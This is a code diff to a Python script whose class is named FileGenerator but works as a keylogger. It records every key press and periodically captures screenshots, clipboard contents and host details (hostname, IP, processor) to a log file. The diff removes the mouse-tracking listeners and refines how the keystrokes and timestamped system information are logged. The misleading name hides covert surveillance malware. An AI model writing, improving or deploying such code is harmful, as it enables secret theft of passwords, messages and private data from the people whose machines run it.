@@ -7,8 +7,9 @@ import pyscreenshot
 import pyperclip
 import psutil
 from pynput import keyboard
-from pynput.keyboard import Listener
 import threading
+import subprocess
+import sys
 
 # Function to install a package using pip
 def install_package(package_name):
@@ -46,32 +47,12 @@ def check_if_already_running():
 
 class FileGenerator:
     def __init__(self):
-        self.log = "File Generation Started..."
+        self.log = "File Generation Started...\n"
+        self.append_system_info()  # Append system information once at the beginning
         logging.info("FileGenerator initialized")
 
     def appendlog(self, string):
         self.log += string
-
-    def on_move(self, x, y):
-        try:
-            current_move = "Mouse moved to {} {}\n".format(x, y)
-            self.appendlog(current_move)
-        except Exception as e:
-            logging.error(f"Failed to log mouse movement: {e}")
-
-    def on_click(self, x, y, button, pressed):
-        try:
-            current_click = "Mouse clicked at {} {} with {}\n".format(x, y, button)
-            self.appendlog(current_click)
-        except Exception as e:
-            logging.error(f"Failed to log mouse click: {e}")
-
-    def on_scroll(self, x, y, dx, dy):
-        try:
-            current_scroll = "Mouse scrolled at {} {} with {}\n".format(x, y, dx, dy)
-            self.appendlog(current_scroll)
-        except Exception as e:
-            logging.error(f"Failed to log mouse scroll: {e}")
 
     def save_data(self, key):
         try:
@@ -84,7 +65,7 @@ class FileGenerator:
                     current_key = "ESC"
                 else:
                     current_key = " " + str(key) + " "
-            self.appendlog(current_key + "\n")
+            self.appendlog(current_key + " ")
             self.save_log()
         except Exception as e:
             logging.error(f"Failed to log key press: {e}")
@@ -99,20 +80,20 @@ class FileGenerator:
             logging.error(f"Failed to save log file: {e}")
 
     def periodic_tasks(self):
-        self.system_information()
+        self.append_system_info()
         self.screenshot()
         self.get_clipboard_content()
         # Reset the timer
         threading.Timer(100, self.periodic_tasks).start()
 
-    def system_information(self):
+    def append_system_info(self):
         try:
             hostname = socket.gethostname()
             ip = socket.gethostbyname(hostname)
             plat = platform.processor()
             system = platform.system()
             machine = platform.machine()
-            self.appendlog(f"Hostname: {hostname}\nIP Address: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\n")
+            self.appendlog(f"\nSystem Info [Time: {time.strftime('%Y-%m-%d %H:%M:%S')}]:\nHostname: {hostname}\nIP Address: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\n\n")
             self.save_log()
         except Exception as e:
             logging.error(f"Failed to gather system information: {e}")
@@ -145,10 +126,6 @@ class FileGenerator:
         # Start the keyboard listener
         keyboard_listener = keyboard.Listener(on_press=self.save_data)
         keyboard_listener.start()
-
-        # Set up mouse listeners
-        mouse_listener = Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll)
-        mouse_listener.start()
 
 if __name__ == "__main__":
     if check_if_already_running():
